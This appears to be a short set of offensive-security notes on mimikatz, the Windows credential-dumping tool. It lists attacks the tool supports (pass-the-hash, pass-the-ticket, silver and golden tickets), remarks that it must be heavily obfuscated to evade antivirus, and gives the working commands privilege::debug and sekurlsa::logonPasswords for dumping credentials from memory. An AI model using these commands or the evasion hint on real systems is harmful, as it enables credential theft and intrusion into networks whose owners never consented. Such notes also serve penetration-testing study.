* Used to steal credentials, generate Kerberos tickets and leverage attacks.
* Dump credentials stored in memory.
* Just a few attacks: Credential Dumping, Pass the Hash, Over Pass the Hash, Pass the Ticket, Silver Ticket, Golden Ticket, etc.
* Easily detected by Antivirus though. Must be ridiculously obfuscated to work.
How to list modules:
```
privilege::
```
When using mimikatz, first thing to do is set privilege mode to debug.
```
privilege::debug
```
sekurlsa module:
```
sekurlsa::
```
Dumping local credentials using sekurlsa:
```
sekurlsa::logonPasswords
```
